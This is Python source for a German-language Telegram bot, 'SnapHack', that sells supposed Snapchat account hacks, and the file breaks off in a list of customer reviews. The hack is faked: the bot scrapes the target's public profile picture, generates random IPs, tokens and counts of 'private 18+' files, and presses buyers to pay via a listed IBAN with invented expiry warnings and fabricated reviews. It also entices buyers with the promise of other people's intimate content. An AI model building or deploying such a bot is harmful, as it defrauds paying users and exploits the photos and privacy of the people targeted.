import os
import subprocess
import time
from threading import Thread
from pathlib import Path
from random import sample, randint
from flask import Flask
import asyncio
import re
import requests
from bs4 import BeautifulSoup
from PIL import Image, ImageFilter
import urllib.request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telegram.constants import ParseMode

# 📂 Dateien
USERS_FILE = "users.txt"
COUNTER_FILE = "hack_counter.txt"

# ---- Hack-Zähler (persistent) ----
def get_hack_count() -> int:
    if not os.path.exists(COUNTER_FILE):
        with open(COUNTER_FILE, "w") as f:
            f.write("533")
        return 533
    with open(COUNTER_FILE, "r") as f:
        try:
            return int(f.read().strip())
        except ValueError:
            return 533

def increment_hack_count() -> int:
    count = get_hack_count() + 1
    with open(COUNTER_FILE, "w") as f:
        f.write(str(count))
    return count

# ✅ Umgebungsvariablen laden
TOKEN = os.getenv("TOKEN")
CHANNEL_ID = os.getenv("CHANNEL_ID")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")

if not TOKEN:
    raise ValueError("❌ Umgebungsvariable 'TOKEN' fehlt!")
if not CHANNEL_ID or not ADMIN_CHAT_ID:
    raise ValueError("❌ 'CHANNEL_ID' oder 'ADMIN_CHAT_ID' fehlt!")

CHANNEL_ID = int(CHANNEL_ID)
ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)

# 🗂️ Ordner einrichten
BASE = Path(__file__).parent
IMAGE_DIR = BASE / "images"
VIDEO_DIR = BASE / "videos"
TEMP_DIR  = BASE / "temp"
PROFILE_DIR = BASE / "profiles"

for p in (IMAGE_DIR, VIDEO_DIR, TEMP_DIR, PROFILE_DIR):
    p.mkdir(exist_ok=True, parents=True)

# 💬 Mapping: Nachricht-ID im Admin-Chat -> User-ID
forwarded_msg_to_user: dict[int, int] = {}

# ---- Speicher ----
user_proof_sent = set()
user_content_counts = {}
age_verified = set()
user_plan: dict[int, str] = {}
refund_state: dict[int, dict] = {}
hilfe_state: dict[int, dict] = {}

# ---- Hack-Limit ----
HACK_LIMIT = 2
HACK_WINDOW_SECS = 12 * 3600
user_hack_times: dict[int, list] = {}

# ---- Hack-Verlauf ----
user_hack_history: dict[int, list[str]] = {}

# ---- Premium Freischaltung ----
premium_pending: set[int] = set()
premium_approved: set[int] = set()

# ---- Letztes Hack-Ziel pro Nutzer ----
user_last_target: dict[int, str] = {}

# ---- Aktive Erinnerungs-Tasks ----
user_reminder_tasks: dict[int, asyncio.Task] = {}

# ---- Hack-Bestätigung ----
pending_hack_results: dict[int, dict] = {}
user_confirm_used: dict[int, float] = {}
CONFIRM_WINDOW_SECS = 12 * 3600

# ---- Auto-Cleanup Intervall ----
CLEANUP_INTERVAL_HOURS = 6

# ---- Hilfsfunktion: Nutzer-Bezeichnung ----
def user_label(from_user) -> str:
    if from_user.username:
        return f"@{from_user.username}"
    name_parts = [from_user.first_name or "", from_user.last_name or ""]
    full_name = " ".join(p for p in name_parts if p).strip()
    if full_name:
        return full_name
    return f"ID: {from_user.id}"

# ---- Automatische Erinnerungen ----
async def schedule_reminders(bot, user_id: int):
    try:
        await asyncio.sleep(3600)
        if user_id not in user_proof_sent:
            try:
                await bot.send_message(
                    chat_id=user_id,
                    text=(
                        "⏳ <b>Dein Hack-Zugang läuft ab!</b>\n\n"
                        "Hey! Du hast vor Kurzem ein Paket ausgewählt, aber noch keine "
                        "Zahlung abgeschlossen.\n\n"
                        "📂 Deine gesicherten Daten werden in Kürze automatisch gelöscht.\n\n"
                        "👉 Jetzt freischalten mit /pay\n\n"
                        "🔒 Alle Zahlungen sind sicher &amp; anonym."
                    ),
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
        await asyncio.sleep(7200)
        if user_id not in user_proof_sent:
            try:
                await bot.send_message(
                    chat_id=user_id,
                    text=(
                        "🚨 <b>Letzte Chance — Zugang verfällt bald!</b>\n\n"
                        "Wir haben noch keinen Zahlungsbeleg von dir erhalten.\n\n"
                        "💾 Die gesicherten Inhalte des gehackten Kontos werden in "
                        "wenigen Stunden endgültig gelöscht.\n\n"
                        "💳 Jetzt zahlen: /pay\n"
                        "📸 Oder sende deinen Zahlungsbeleg direkt hier im Chat.\n\n"
                        "❓ Fragen? Schreib uns: @HunterThe1"
                    ),
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
    except asyncio.CancelledError:
        pass

async def schedule_premium_reminder(bot, user_id: int):
    try:
        await asyncio.sleep(1800)
        if user_id in premium_pending and user_id not in premium_approved:
            try:
                await bot.send_message(
                    chat_id=user_id,
                    text=(
                        "💎 <b>Dein Premium-Zugang wartet auf dich!</b>\n\n"
                        "Du hast das PREMIUM-Paket ausgewählt, aber noch keinen "
                        "Zahlungsbeleg eingeschickt.\n\n"
                        "📸 Sende einfach ein Foto oder Video deiner Überweisung "
                        "direkt hier im Chat — dann schalten wir dich sofort frei.\n\n"
                        "🏦 <b>IBAN:</b> <code>LT62 3130 0101 0634 0669</code>\n"
                        "👤 <b>Empfänger:</b> <code>Euro Hunter</code>\n"
                        "💶 <b>Betrag:</b> <code>95,00 EUR</code>\n\n"
                        "⏳ Dein Platz ist noch reserviert!"
                    ),
                    parse_mode=ParseMode.HTML
                )
            except Exception:
                pass
    except asyncio.CancelledError:
        pass

# ---- Auto-Cleanup ----
async def auto_cleanup(app):
    while True:
        await asyncio.sleep(CLEANUP_INTERVAL_HOURS * 3600)
        deleted = 0
        for folder in (TEMP_DIR, PROFILE_DIR):
            for f in folder.glob("*"):
                if f.is_file() and f.name != ".gitkeep":
                    try:
                        f.unlink()
                        deleted += 1
                    except Exception:
                        pass
        print(f"🧹 Cleanup: {deleted} Dateien gelöscht.")

# 📥 GitHub Media Downloader
def download_github_media():
    github_api_base = "https://api.github.com/repos/Ayman5552/snap/contents"
    imgs = [f for f in IMAGE_DIR.glob("*.*") if f.suffix.lower() in ('.jpg', '.jpeg', '.png', '.gif', '.webp') and f.name != '.gitkeep']
    vids = [f for f in VIDEO_DIR.glob("*.*") if f.suffix.lower() in ('.mp4', '.mov', '.avi') and f.name != '.gitkeep']
    if len(imgs) >= 5 and len(vids) >= 5:
        print(f"✅ Media bereits vorhanden: {len(imgs)} Bilder, {len(vids)} Videos")
        return True
    print("📥 Lade Media von GitHub...")
    try:
        img_response = requests.get(f"{github_api_base}/Images", timeout=30)
        if img_response.status_code == 200:
            for img in img_response.json()[:10]:
                if img['name'].lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
                    img_path = IMAGE_DIR / img['name']
                    if not img_path.exists():
                        try:
                            urllib.request.urlretrieve(img['download_url'], img_path)
                        except Exception as e:
                            print(f"❌ {img['name']}: {e}")
    except Exception as e:
        print(f"⚠️ Bilder: {e}")
    try:
        vid_response = requests.get(f"{github_api_base}/videos", timeout=30)
        if vid_response.status_code == 200:
            for vid in vid_response.json()[:5]:
                if vid['name'].lower().endswith(('.mp4', '.mov', '.avi')):
                    vid_path = VIDEO_DIR / vid['name']
                    if not vid_path.exists():
                        try:
                            urllib.request.urlretrieve(vid['download_url'], vid_path)
                        except Exception as e:
                            print(f"❌ {vid['name']}: {e}")
    except Exception as e:
        print(f"⚠️ Videos: {e}")
    return True

# 🎛️ Blur
BLUR_IMAGE_RADIUS = 28
VIDEO_BLUR_SIGMA = 36

# ---- Webserver (keep alive) ----
app = Flask('')

@app.route('/')
def home():
    return "I'm alive"

def keep_alive():
    port = int(os.environ.get("PORT", 5000))
    Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()

# ---- Bild/Video Verarbeitung ----
def censor_image(input_path: Path, output_path: Path):
    try:
        im = Image.open(input_path).convert("RGB")
        im = im.filter(ImageFilter.GaussianBlur(BLUR_IMAGE_RADIUS))
        im.save(output_path, format="JPEG", quality=90)
        return True
    except Exception as e:
        print(f"❌ Zensieren fehlgeschlagen: {e}")
        return False

def check_ffmpeg():
    try:
        subprocess.run(['ffmpeg', '-version'], capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def censor_video(input_path: Path, output_path: Path):
    if not check_ffmpeg():
        return False
    cmd = [
        "ffmpeg", "-y", "-i", str(input_path),
        "-vf", f"gblur=sigma={VIDEO_BLUR_SIGMA}",
        "-c:v", "libx264", "-preset", "veryfast", "-crf", "28", "-an",
        str(output_path),
    ]
    try:
        subprocess.run(cmd, check=True, capture_output=True, text=True)
        return True
    except subprocess.CalledProcessError as e:
        print("❌ ffmpeg:", e.stderr)
        return False

# ---- Snapchat Scraping ----
def extract_snapchat_profile_data(username: str):
    url = f"https://www.snapchat.com/@{username}"
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    try:
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code != 200:
            return False, None, None, None
        if "Sorry, this account doesn't exist." in resp.text or "Not Found" in resp.text:
            return False, None, None, None
        soup = BeautifulSoup(resp.text, "html.parser")
        name = username
        title = soup.find("title")
        if title:
            name = title.text.strip().split("(")[0].strip()
        bitmoji_url = None
        for elem in soup.find_all(['img', 'picture', 'source'], attrs={'src': re.compile(r'.*bitmoji.*', re.I)}):
            src = elem.get('src')
            if src:
                bitmoji_url = str(src)
                break
        if not bitmoji_url:
            for elem in soup.find_all(['img', 'picture', 'source'], attrs={'data-src': re.compile(r'.*bitmoji.*', re.I)}):
                src = elem.get('data-src')
                if src:
                    bitmoji_url = str(src)
                    break
        profile_photo_url = None
        for elem in soup.find_all(['img'], attrs={'src': re.compile(r'.*(profile|avatar|user).*\.(jpg|jpeg|png|webp)', re.I)}):
            src = elem.get('src')
            if src and 'bitmoji' not in str(src).lower():
                profile_photo_url = str(src)
                break
        if not profile_photo_url:
            meta = soup.find('meta', property='og:image')
            if meta:
                content = meta.get('content')
                if content and 'bitmoji' not in str(content).lower():
                    profile_photo_url = str(content)
        return True, name, bitmoji_url, profile_photo_url
    except Exception as e:
        print("Snapchat Fehler:", e)
        return False, None, None, None

def download_image(url: str, filename: str) -> bool:
    if not url:
        return False
    clean_filename = re.sub(r'[^\w\-_\.]', '_', filename)
    if not clean_filename or '..' in clean_filename:
        clean_filename = f"profile_{hash(filename) % 10000}.jpg"
    try:
        response = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
        if response.status_code == 200:
            with open(PROFILE_DIR / clean_filename, 'wb') as f:
                f.write(response.content)
            return True
    except Exception as e:
        print(f"❌ Download {url}: {e}")
    return False

# ---- Hack Hilfsfunktionen ----
def progress_bar(percent: int, length: int = 16) -> str:
    filled = int(length * percent / 100)
    return f"[{'█' * filled}{'░' * (length - filled)}] {percent}%"

def fake_ip() -> str:
    return f"{randint(100,255)}.{randint(10,254)}.{randint(10,254)}.{randint(1,99)}"

def fake_token() -> str:
    chars = "abcdef0123456789"
    return "".join(sample(chars, 8)) + "-" + "".join(sample(chars, 4))

# ---- PAKET-AUSWAHL ----
PACKAGE_KEYBOARD = InlineKeyboardMarkup([
    [InlineKeyboardButton("📦 BASIC — 45 € / Hack", callback_data="plan_basic")],
    [InlineKeyboardButton("💎 PREMIUM — 95 € / Monat", callback_data="plan_premium")],
])

PACKAGE_TEXT = (
    "🎯 <b>Wähle dein Paket:</b>\n"
    "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
    "📦 <b>BASIC — 45 € / Hack</b>\n"
    "• 1 Hack nach Bedarf\n"
    "• Zugriff auf alle Inhalte\n"
    "• Sofortzugang nach Zahlung\n\n"
    "💎 <b>PREMIUM — 95 € / Monat</b>\n"
    "• 2 Hacks pro Woche\n"
    "• Prioritäts-Support\n"
    "• Exklusiver Dauerzugang\n\n"
    "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
    "👇 Wähle jetzt dein Paket:"
)

def main_menu_text(plan: str) -> str:
    if plan == "premium":
        paket_info = "💎 <b>Paket:</b> <code>PREMIUM — 2 Hacks/Woche (95 €/Monat)</code>\n\n"
    else:
        paket_info = "📦 <b>Paket:</b> <code>BASIC — 45 € pro Hack</code>\n\n"
    return (
        "🖥 <b>SnapHack v2.4 — gestartet</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        "✅ Paket ausgewählt. Zugang gewährt.\n\n"
        f"{paket_info}"
        "⚠️ <b>Voraussetzungen:</b> Zielkonto muss in den letzten 30 Tagen aktiv gewesen sein "
        "&amp; unter 18.000 Follower haben.\n\n"
        "<b>Schritt 1:</b> Tritt unserem Kanal bei:\n"
        "👉 t.me/+7tgziUqjnZUyZDYx\n\n"
        "<b>Schritt 2:</b> Starte deinen Hack:\n"
        "<code>/hack Benutzername</code>\n\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n"
        "⭐ Bewertungen: /bew\n"
        "💳 Zahlungsbeweise einfach hier im Chat senden."
    )

# ---- START ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id

    if uid not in age_verified:
        keyboard = [
            [InlineKeyboardButton("✅ Ja, ich bin volljährig (18+)", callback_data="age_yes")],
            [InlineKeyboardButton("❌ Nein, ich bin minderjährig", callback_data="age_no")],
        ]
        await update.message.reply_text(
            "👋 Willkommen! Bevor es losgeht, brauchen wir kurz deine Bestätigung.\n\n"
            "⚠️ <b>Dieser Bot richtet sich ausschließlich an Personen ab 18 Jahren.</b>\n\n"
            "Bitte bestätige dein Alter, um fortzufahren:",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    uname = user.username or ""
    with open(USERS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid} {uname}\n")

    if uid not in user_plan:
        await update.message.reply_text(
            PACKAGE_TEXT,
            parse_mode=ParseMode.HTML,
            reply_markup=PACKAGE_KEYBOARD
        )
        return

    await update.message.reply_text(
        main_menu_text(user_plan[uid]),
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

# ---- ALTERSVERIFIKATION ----
async def age_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    uid = user.id

    if query.data == "age_yes":
        age_verified.add(uid)
        uname = user.username or ""
        with open(USERS_FILE, "a", encoding="utf-8") as f:
            f.write(f"{uid} {uname}\n")
        await query.edit_message_text(
            "✅ <b>Alter bestätigt!</b>\n\n" + PACKAGE_TEXT,
            parse_mode=ParseMode.HTML,
            reply_markup=PACKAGE_KEYBOARD
        )
    elif query.data == "age_no":
        await query.edit_message_text(
            "🚫 Dieser Bot ist nur für Personen ab 18 Jahren zugänglich.\n\n"
            "Bitte komm wieder, sobald du volljährig bist! 👋"
        )

# ---- ADMIN: /listusers ----
async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    if not os.path.exists(USERS_FILE):
        await update.message.reply_text("Noch keine Nutzer gespeichert.")
        return
    with open(USERS_FILE, "r", encoding="utf-8") as f:
        data = f.read().strip()
    await update.message.reply_text(f"📋 Gespeicherte Nutzer:\n\n{data}" if data else "Noch keine Nutzer gespeichert.")

# ---- ADMIN: /send ----
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return

    if not context.args:
        await update.message.reply_text(
            "⚠️ Kein Text angegeben!\n\nNutzung:\n<code>/send Deine Nachricht hier</code>",
            parse_mode=ParseMode.HTML
        )
        return

    message = " ".join(context.args)

    if not os.path.exists(USERS_FILE):
        await update.message.reply_text("❌ Keine Nutzer gefunden.")
        return

    with open(USERS_FILE, "r", encoding="utf-8") as f:
        lines = f.read().strip().splitlines()

    seen_ids = set()
    success = 0
    failed = 0

    for line in lines:
        parts = line.strip().split()
        if not parts:
            continue
        try:
            uid = int(parts[0])
        except ValueError:
            continue
        if uid in seen_ids:
            continue
        seen_ids.add(uid)
        try:
            await context.bot.send_message(chat_id=uid, text=message, parse_mode=ParseMode.HTML)
            success += 1
        except Exception:
            failed += 1

    await update.message.reply_text(
        f"✅ Broadcast abgeschlossen.\n\n"
        f"📤 Gesendet: <b>{success}</b>\n"
        f"❌ Fehlgeschlagen: <b>{failed}</b>",
        parse_mode=ParseMode.HTML
    )

# ---- ADMIN: /stats ----
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return

    total_users = 0
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, "r", encoding="utf-8") as f:
            seen = set()
            for line in f:
                parts = line.strip().split()
                if parts:
                    try:
                        seen.add(int(parts[0]))
                    except ValueError:
                        pass
        total_users = len(seen)

    now = time.time()
    hacks_today = sum(
        len([t for t in times if now - t < 86400])
        for times in user_hack_times.values()
    )

    total_hacks = get_hack_count()

    await update.message.reply_text(
        "📊 <b>Bot-Statistiken</b>\n"
        "<code>━━━━━━━━━━━━━━━━━━━━━━━━━━━━</code>\n\n"
        f"👥 <b>Gesamt-Nutzer:</b> <code>{total_users}</code>\n"
        f"💎 <b>Premium ausstehend:</b> <code>{len(premium_pending)}</code>\n"
        f"✅ <b>Premium aktiv:</b> <code>{len(premium_approved)}</code>\n"
        f"💻 <b>Hacks heute:</b> <code>{hacks_today}</code>\n"
        f"🔢 <b>Hacks gesamt:</b> <code>{total_hacks}</code>\n"
        f"💳 <b>Bezahlt:</b> <code>{len(user_proof_sent)}</code>",
        parse_mode=ParseMode.HTML
    )

# ---- ADMIN: /remind ----
async def remind_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return

    if not os.path.exists(USERS_FILE):
        await update.message.reply_text("❌ Keine Nutzer gefunden.")
        return

    with open(USERS_FILE, "r", encoding="utf-8") as f:
        lines = f.read().strip().splitlines()

    seen_ids = set()
    success = 0
    failed = 0

    for line in lines:
        parts = line.strip().split()
        if not parts:
            continue
        try:
            uid = int(parts[0])
        except ValueError:
            continue
        if uid in seen_ids:
            continue
        seen_ids.add(uid)
        if uid in user_proof_sent:
            continue

        target = user_last_target.get(uid)
        total_secs = randint(10, 600)
        mins = total_secs // 60
        secs = total_secs % 60
        duration_str = f"{mins}:{secs:02d} Min." if mins > 0 else f"0:{secs:02d} Min."
        mb_size = round(total_secs * randint(80, 250) / 1000, 1)
        mb_str = f"{mb_size} MB"

        if target:
            message = (
                f"🔴 <b>Neue Aktivität erkannt!</b>\n\n"
                f"<a href=\"https://snapchat.com/@{target}\">snapchat.com/@{target}</a> hat gerade ein neues <b>privates Video</b> hochgeladen.\n\n"
                f"📹 <b>Länge:</b> <code>{duration_str}</code>\n"
                f"📦 <b>Größe:</b> <code>{mb_str}</code>\n"
                f"🔒 <b>Status:</b> <code>Privat — nur für Follower sichtbar</code>\n"
                f"💾 Das Video wurde bereits auf unseren Servern gesichert.\n\n"
                f"⚠️ <b>Zugang läuft in Kürze ab!</b>\n\n"
                f"👉 Jetzt freischalten: /pay\n"
                f"❓ Fragen? @HunterThe1"
            )
        else:
            message = (
                "🔴 <b>Neue Aktivität erkannt!</b>\n\n"
                "Das gehackte Konto hat gerade ein neues <b>privates Video</b> hochgeladen.\n\n"
                f"📹 <b>Länge:</b> <code>{duration_str}</code>\n"
                f"📦 <b>Größe:</b> <code>{mb_str}</code>\n"
                f"🔒 <b>Status:</b> <code>Privat — nur für Follower sichtbar</code>\n"
                "💾 Das Video wurde bereits auf unseren Servern gesichert.\n\n"
                "⚠️ <b>Zugang läuft in Kürze ab!</b>\n\n"
                "👉 Jetzt freischalten: /pay\n"
                "❓ Fragen? @HunterThe1"
            )
        try:
            await context.bot.send_message(chat_id=uid, text=message, parse_mode=ParseMode.HTML)
            success += 1
        except Exception:
            failed += 1

    await update.message.reply_text(
        f"✅ Erinnerungen gesendet.\n\n"
        f"📤 Gesendet: <b>{success}</b>\n"
        f"❌ Fehlgeschlagen: <b>{failed}</b>",
        parse_mode=ParseMode.HTML
    )

# ---- ADMIN: /sendcontent ----
async def send_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    await update.message.reply_text("Hinweis: Automatisches Versenden von Preview-Medien ist deaktiviert.")

# ---- HACK ----
async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ["left", "kicked"]:
            await update.message.reply_text(
                "⛔ <b>Zugriff verweigert</b>\n\n"
                "Du musst zuerst unserem Kanal beitreten:\n\n"
                "👉 t.me/+7tgziUqjnZUyZDYx\n\n"
                "Danach einfach nochmal /hack versuchen.",
                parse_mode=ParseMode.HTML
            )
            return
    except Exception as e:
        print("Fehler bei get_chat_member:", e)
        await update.message.reply_text("⚠️ Fehler bei der Kanal-Überprüfung. Bitte später erneut versuchen.")
        return

    if user_plan.get(user_id) == "premium" and user_id not in premium_approved:
        await update.message.reply_text(
            "⏳ <b>Dein Premium-Zugang wird noch geprüft.</b>\n\n"
            "Sobald dein Zahlungsbeleg bestätigt wurde, wirst du automatisch benachrichtigt "
            "und kannst sofort loslegen.\n\n"
            "Falls du noch kein Beweisfoto oder -video gesendet hast, sende es jetzt einfach hier im Chat.",
            parse_mode=ParseMode.HTML
        )
        return

    now = time.time()
    recent = [t for t in user_hack_times.get(user_id, []) if now - t < HACK_WINDOW_SECS]
    if len(recent) >= HACK_LIMIT:
        next_allowed = recent[0] + HACK_WINDOW_SECS
        remaining = next_allowed - now
        wait_h = int(remaining // 3600)
        wait_m = int((remaining % 3600) // 60)
        await update.message.reply_text(
            "⛔ <b>Tages-Limit erreicht!</b>\n\n"
            "Du hast bereits <b>2 Benutzernamen</b> in den letzten 12 Stunden überprüft.\n\n"
            f"⏳ Bitte warte noch <b>{wait_h} Stunde(n) {wait_m} Minute(n)</b>, "
            f"dann stehen dir neue Hacks zur Verfügung.\n\n"
            "💎 Mit dem <b>PREMIUM-Paket</b> bekommst du 2 Hacks pro Woche — jetzt upgraden mit /start",
            parse_mode=ParseMode.HTML
        )
        return

    if not context.args:
        await update.message.reply_text(
            "⚠️ <b>Kein Benutzername angegeben!</b>\n\n"
            "Nutze den Befehl so:\n"
            "<code>/hack Benutzername</code>\n\n"
            "Beispiel: <code>/hack Lina.123</code>",
            parse_mode=ParseMode.HTML
        )
        return

    user_hack_times[user_id] = recent + [now]

    username = context.args[0]
    user_last_target[user_id] = username

    # Hack-Verlauf speichern
    if user_id not in user_hack_history:
        user_hack_history[user_id] = []
    user_hack_history[user_id].append(username)

    hack_nr = increment_hack_count()
    ip_src = fake_ip()
    ip_dst = fake_ip()
    session_token = fake_token()
    last_seen_min = randint(14, 40)
    neue_inhalte = randint(2, 6)

    msg = await update.message.reply_text(
        "<code>[ SCAN  ] Überprüfe Ziel-Profil...</code>",
        parse_mode=ParseMode.HTML
    )

    exists, name, bitmoji_url, profile_photo_url = await asyncio.to_thread(extract_snapchat_profile_data, username)

    if not exists:
        await msg.edit_text(
            "<code>[ ERROR ] Konto nicht gefunden oder privat gesperrt.\n"
            "[ INFO  ] Prüfe ob der Username korrekt ist.</code>",
            parse_mode=ParseMode.HTML
        )
        return

    bitmoji_downloaded = False
    profile_downloaded = False
    if bitmoji_url and isinstance(bitmoji_url, str):
        bitmoji_downloaded = await asyncio.to_thread(download_image, bitmoji_url, f"bitmoji_{username}.jpg")
    if profile_photo_url and isinstance(profile_photo_url, str):
        profile_downloaded = await asyncio.to_thread(download_image, profile_photo_url, f"profile_{username}.jpg")

    bilder = randint(8, 12)
    videos = randint(7, 8)
    user_content_counts[user_id] = {"bilder": bilder, "videos": videos}

    snap_link = f'<a href="https://snapchat.com/@{username}">snapchat.com/@{username}</a>'

    result_lines = (
        f"<code>{'━'*34}</code>\n<code>   ✅ HACK ERFOLGREICH ABGESCHLOSSEN</code>\n<code>{'━'*34}</code>\n\n"
        f"🔢 <b>Hack #{hack_nr}</b>\n🎯 <b>Ziel:</b> {snap_link}\n"
        f"👤 <b>Name:</b> <code>{name}</code>\n🔓 <b>Status:</b> <code>Konto kompromittiert</code>\n"
        f"🕐 <b>Zuletzt aktiv:</b> <code>vor {last_seen_min} Minuten</code>\n"
        f"📅 <b>Diese Woche neu:</b> <code>{neue_inhalte} Dateien (privat)</code>\n\n"
        f"📂 <b>Gesicherte Inhalte:</b>\n  🖼 <code>{bilder} Bilder (18+ markiert)</code>\n"
        f"  📹 <code>{videos} Videos (privat)</code>\n"
    )
    if bitmoji_downloaded:
        result_lines += f"  🎭 <code>Bitmoji extrahiert</code>\n"
    if profile_downloaded:
        result_lines += f"  📸 <code>Profilbild gesichert</code>\n"
    result_lines += (
        f"\n<code>{'━'*34}</code>\n💰 <b>Zugang freischalten für 45 €</b>\n\n"
        f"👉 Zahlung starten mit /pay\n"
        f"🔗 Mega-Ordner: https://mega.nz/folder/JU5zGDxQ#-Hxqn4xBLRIbM8vBFFFvZQ\n\n"
        f"🎁 <i>Erster Hack? Du bekommst 40 € zurück — einmalig!</i>\n👥 Gratis-Hack durch Einladen: /invite"
    )

    result_caption = (
        f"<code>{'━'*28}</code>\n<code>  ✅ HACK ERFOLGREICH — #{hack_nr}</code>\n<code>{'━'*28}</code>\n\n"
        f"🎯 <b>Ziel:</b> {snap_link}\n👤 <b>Name:</b> <code>{name}</code>\n"
        f"🔓 <b>Status:</b> <code>Konto kompromittiert</code>\n"
        f"🕐 <b>Zuletzt aktiv:</b> <code>vor {last_seen_min} Min.</code>\n\n"
        f"📂 <b>Gesicherte Inhalte:</b>\n  🖼 <code>{bilder} Bilder (18+)</code>\n"
        f"  📹 <code>{videos} Videos (privat)</code>\n  📸 <code>Profilbild gesichert ✅</code>\n\n"
        f"<code>{'━'*28}</code>\n💰 <b>Zugang freischalten: 45 €</b>\n👉 /pay\n"
        f"🎁 <i>Erster Hack? 40 € zurück!</i>\n👥 Gratis-Hack: /invite"
    )

    pending_hack_results[user_id] = {
        "result_lines": result_lines,
        "result_caption": result_caption,
        "profile_downloaded": profile_downloaded,
        "bitmoji_downloaded": bitmoji_downloaded,
        "username": username,
        "ip_src": ip_src,
        "ip_dst": ip_dst,
        "session_token": session_token,
        "name": name,
        "bilder": bilder,
        "videos": videos,
        "last_seen_min": last_seen_min,
        "neue_inhalte": neue_inhalte,
        "hack_nr": hack_nr,
    }

    last_confirm = user_confirm_used.get(user_id, 0)
    confirm_available = (now - last_confirm) >= CONFIRM_WINDOW_SECS

    confirm_kb = InlineKeyboardMarkup([
        [
            InlineKeyboardButton("✅ Ja, richtiger Account", callback_data="hack_confirm_yes"),
            InlineKeyboardButton("❌ Nein, falscher Account", callback_data="hack_confirm_no"),
        ]
    ])

    confirm_text = (
        f"🔍 <b>Account gefunden!</b>\n\n"
        f"🎯 <b>Ziel:</b> {snap_link}\n"
        f"👤 <b>Name:</b> <code>{name}</code>\n"
        f"🕐 <b>Zuletzt aktiv:</b> <code>vor {last_seen_min} Min.</code>\n\n"
        f"❓ <b>Ist das der richtige Account?</b>"
    )

    await msg.delete()

    async def send_expiry_warning():
        await asyncio.sleep(30)
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=(f"⚠️ <b>Achtung — Zugang läuft ab!</b>\n\nDein Zugriff auf {snap_link} "
                      f"ist noch <b>10 Minuten</b> aktiv.\n\nDanach werden die gesicherten Daten automatisch gelöscht.\n\n"
                      f"👉 Jetzt freischalten mit /pay"),
                parse_mode=ParseMode.HTML
            )
        except Exception as e:
            print(f"⚠️ Ablauf-Warnung: {e}")
    asyncio.create_task(send_expiry_warning())

    if confirm_available:
        if profile_downloaded:
            try:
                with open(PROFILE_DIR / f"profile_{username}.jpg", "rb") as photo_f:
                    await context.bot.send_photo(
                        chat_id=user_id, photo=photo_f,
                        caption=confirm_text, parse_mode=ParseMode.HTML,
                        reply_markup=confirm_kb
                    )
                return
            except Exception:
                pass
        if bitmoji_downloaded:
            try:
                with open(PROFILE_DIR / f"bitmoji_{username}.jpg", "rb") as photo_f:
                    await context.bot.send_photo(
                        chat_id=user_id, photo=photo_f,
                        caption=confirm_text, parse_mode=ParseMode.HTML,
                        reply_markup=confirm_kb
                    )
                return
            except Exception:
                pass
        await context.bot.send_message(
            chat_id=user_id, text=confirm_text,
            parse_mode=ParseMode.HTML, reply_markup=confirm_kb
        )
    else:
        if profile_downloaded:
            try:
                with open(PROFILE_DIR / f"profile_{username}.jpg", "rb") as photo_f:
                    await context.bot.send_photo(chat_id=user_id, photo=photo_f, caption=result_caption, parse_mode=ParseMode.HTML)
                return
            except Exception:
                pass
        if bitmoji_downloaded:
            try:
                with open(PROFILE_DIR / f"bitmoji_{username}.jpg", "rb") as photo_f:
                    await context.bot.send_photo(chat_id=user_id, photo=photo_f, caption=result_caption, parse_mode=ParseMode.HTML)
                return
            except Exception:
                pass
        await context.bot.send_message(chat_id=user_id, text=result_lines, parse_mode=ParseMode.HTML, disable_web_page_preview=True)

# ---- VERLAUF ----
async def verlauf(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    history = user_hack_history.get(uid, [])
    if not history:
        await update.message.reply_text("📂 Du hast noch keine Hacks durchgeführt.")
        return
    lines = "\n".join(f"• <code>{u}</code>" for u in history)
    await update.message.reply_text(
        f"📂 <b>Dein Hack-Verlauf:</b>\n\n{lines}",
        parse_mode=ParseMode.HTML
    )

# ---- BEWERTUNGEN ----
BEWERTUNGEN = [
    ("m***l", "Hat alles geklappt. Fotos waren da innerhalb von 5 Min nach Zahlung. Sehr seriös!"),
    ("l***.w", "Erster Hack war mit Refund, jetzt regelmäßiger Kunde. Schnell & diskret 👍"),
